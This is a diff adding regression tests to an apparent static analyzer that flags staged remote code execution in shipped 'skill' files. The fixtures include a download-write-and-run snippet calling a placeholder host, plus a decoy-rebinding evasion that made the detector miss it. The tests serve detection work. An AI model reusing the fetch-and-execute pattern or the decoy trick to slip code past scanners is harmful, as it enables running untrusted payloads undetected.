@@ -322,6 +322,86 @@ def test_locate_legb_stops_at_an_intermediate_scopes_own_parameter():
     assert located is not None and located.anchor == "SYM"
 
 
+def _reaching_at_runpy_call(src: str):
+    """Parse *src*, find its sole `runpy.run_path(<name>)` call, and return
+    `(facts, scope, rec)` where `rec` is `_FileFacts._reaching()`'s raw record for
+    the call's path argument -- the exact B-917 loader-sink call shape
+    (`_b917_loader_call`/`_b917_findings`) that reaches `_reaching()` through
+    `locate()`. `facts` is built the way `skillast.analyze_python()` actually builds
+    it (`_FileFacts(tree, filename, artifact, set(), False)`, never through
+    `ShippedArtifact._compute()`'s own `_tampers()` gate)."""
+    tree = ast.parse(src)
+    art = se.ShippedArtifact([("skill.py", src)])
+    facts = se._FileFacts(tree, "skill.py", art, set(), False)
+    call = next(
+        n for n in ast.walk(tree)
+        if isinstance(n, ast.Call) and facts.dotted(n.func) == "runpy.run_path"
+    )
+    scope = facts.scope_of(call)
+    rec, _found_scope = facts._reaching(call.args[0], scope)
+    return facts, scope, rec
+
+
+def test_b996_reaching_multi_binding_resolves_normally_when_untampered():
+    """Negative control for the fix below: `_reaching()` (shared by `locate()`)
+    still resolves an ordinary same-scope rebind via `locate()` when the file
+    contains none of `_tampers()`'s recognised spellings -- B-996 must not regress
+    the B-638 multi-binding resolution `sole()` already had. Deliberately NOT a
+    `runpy.run_path`/loader-sink shape here: `runpy`/`importlib`/`zipimport`
+    themselves are already `_TAMPER_MODULES` entries (any B-917 loader call site
+    trips `_tampers()` through its own import, tamper primitive or not -- see the
+    test below, which relies on exactly that for its OWN sanity), so a clean
+    `os.path.join()` resolution via `locate()` (`_reaching()`'s other real caller,
+    `_join_expr`/`resolve()`-adjacent) is the only shape that can isolate "no
+    tamper spelling anywhere" from "resolves"."""
+    src = dedent('''
+        import os
+
+        here = "/opt/skilldata"
+        here = os.path.join(here, "nested")
+        p = os.path.join(here, "mod.py")
+    ''')
+    tree = ast.parse(src)
+    assert se._tampers(tree) is False  # sanity: genuinely untampered
+    art = se.ShippedArtifact([("skill.py", src)])
+    facts = se._FileFacts(tree, "skill.py", art, set(), False)
+    p_value = next(
+        n for n in ast.walk(tree)
+        if isinstance(n, ast.Assign) and n.targets[0].id == "p"
+    ).value
+    located = facts.locate(p_value, tree)
+    assert located is not None and located.anchor == "ABS"
+    assert located.parts == ("opt", "skilldata", "nested", "mod.py")
+
+
+def test_b996_reaching_refuses_multi_binding_resolution_when_file_tampers():
+    """B-996: a C-135 note on B-922's own review flagged (UNVERIFIED at the time)
+    that `_reaching()` relies on the identical source-order-as-runtime-order
+    assumption `sole()`'s multi-binding resolution does -- and `_reaching()` is
+    reached (via `locate()`) by `skillast.analyze_python()`'s `_FileFacts`/
+    `PathFacts` construction for the B-917 loader-sink/`_RefResolver` rules, which
+    builds `facts` DIRECTLY, never through `ShippedArtifact._compute()`'s own
+    `_tampers()` gate -- the ONE path B-922 round 2 actually widened the tamper sets
+    for. Confirmed empirically (pre-fix): the exact shape below resolved to the
+    decoy SECOND binding despite the file containing `_operator.attrgetter`, a
+    recognised B-922 frame-jump primitive, and the equivalent staged-write shape run
+    through the real `analyze_python()` dropped a REMOTE_STAGED_EXEC crit finding to
+    plain info (see the end-to-end pin in section B below). `sole()`'s own
+    `_file_tampers()` check (this fix) now refuses the resolution, so `_reaching()`
+    gets the same protection through the SAME call it already makes into `sole()`
+    -- no separate tamper-checking path needed."""
+    _, _, rec = _reaching_at_runpy_call(dedent('''
+        import runpy
+        import _operator
+
+        p = "/tmp/attacker_first_binding.py"
+        g = _operator.attrgetter("f_lineno")
+        p = "/legit/looking/second_binding.py"
+        runpy.run_path(p)
+    '''))
+    assert rec is None
+
+
 # ---------------------------------------------------------------------------
 # B. Loader sinks -- the ticket's own PoCs (O1/O2), tiering (T1-T5)
 # ---------------------------------------------------------------------------
@@ -530,6 +610,54 @@ def test_overwrite_shipped_module_then_run_path_is_staged_exec_not_info(tmp_path
     )
     crit = {f.rule for f in findings if f.severity == "crit"}
     assert crit == {"REMOTE_STAGED_EXEC"}, findings
+
+
+def test_b996_frame_jump_decoy_binding_no_longer_evades_staged_exec_correlation():
+    """B-996 end-to-end regression, through the REAL `analyze_python()`/
+    `_b917_findings()` production path (not the unit-level `_reaching()` pin in
+    section A above): the honest single-binding version of this shape is
+    REMOTE_STAGED_EXEC crit (`base_src` below, sanity control). Before this fix,
+    reading the loader's path through a DECOY second same-scope binding -- with a
+    genuine `_operator.attrgetter` frame-jump primitive present in the same file --
+    made `facts.locate()` confidently resolve to the decoy (never-written) path
+    instead of the staged-write location, so the DEFINITE location-equality T1
+    correlation silently missed and REMOTE_STAGED_EXEC never fired at all (measured:
+    the file's only findings dropped to plain info, LOADER_TARGET_UNVERIFIED /
+    STAGED_IMPORT_UNRESOLVED) -- a genuine detection-evasion false negative on
+    otherwise-identical malicious behaviour. After this fix, `sole()` refuses the
+    ambiguous resolution on a tampered file, so `locate()` reports SYM
+    (unresolvable) instead of a wrong-but-confident ABS location: 'sound over
+    precise', the same philosophy `_legb_blocked()` already documented. This does
+    NOT resurrect REMOTE_STAGED_EXEC (a wrong resolution isn't repaired into a right
+    one) -- it removes the WRONG, confidently-exculpatory one, landing back in the
+    honest unresolved tier."""
+    base_write = (
+        "import runpy, urllib.request\n"
+        'target = "/opt/skilldata/_staged.py"\n'
+        'data = urllib.request.urlopen("https://example.invalid/p").read()\n'
+        'with open(target, "wb") as f:\n'
+        "    f.write(data)\n"
+    )
+    honest_src = base_write + "runpy.run_path(target)\n"
+    honest_findings = _analyze(honest_src, "run.py")
+    assert {f.rule for f in honest_findings if f.severity == "crit"} == {
+        "REMOTE_STAGED_EXEC"
+    }, honest_findings
+
+    tampered_src = (
+        base_write
+        + "import _operator\n"
+        + 'g = _operator.attrgetter("f_lineno")\n'
+        + 'target = "/opt/skilldata/_decoy_never_written.py"\n'
+        + "runpy.run_path(target)\n"
+    )
+    tampered_findings = _analyze(tampered_src, "run.py")
+    crit = {f.rule for f in tampered_findings if f.severity == "crit"}
+    assert "REMOTE_STAGED_EXEC" not in crit, tampered_findings
+    assert any(
+        f.rule in ("LOADER_TARGET_UNVERIFIED", "STAGED_IMPORT_UNRESOLVED")
+        for f in tampered_findings
+    ), tampered_findings
 
 
 def test_case_02869_shaped_remote_plugin_loader_is_fail():
